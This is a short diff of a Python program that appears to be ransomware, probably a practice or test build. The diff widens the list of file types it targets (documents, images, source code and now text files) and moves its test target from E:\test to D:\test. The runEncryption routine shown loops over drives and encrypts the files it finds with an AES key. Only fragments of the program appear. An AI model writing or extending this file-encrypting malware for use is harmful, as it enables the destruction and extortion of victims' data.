@@ -17,7 +17,7 @@ from tkinter import ttk
 __rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
 testPath = "./data/"
 
-patterns = ['*.xlsx', '*.docx', '*.doc', '*.pptx', '*.jpeg', '*.png', '*.gif', '*.sql', '*.ai',"*.pdf","*.json","*.c","*.cpp","*.java","*.js","*.py",".cs"]
+patterns = ['*.xlsx', '*.docx', '*.doc', '*.pptx', '*.jpeg', '*.png', '*.gif', '*.sql', '*.ai',"*.pdf","*.json","*.c","*.cpp","*.java","*.js","*.py",".cs","*txt"]
 
 def checkfile():
     rmfilePath = os.path.join(testPath, "lock.json")
@@ -118,7 +118,7 @@ def runEncryption():
     cf = CreateFile(testPath)
     cf.checkfile("lock.json")
     #drives = getAvaiblableDrives()
-    drives = ["E:\\test"]  # For testing purpose
+    drives = ["D:\\test"]  # For testing purpose
     print(drives)
     fileNumber = 0
     aseKey = aesKey()
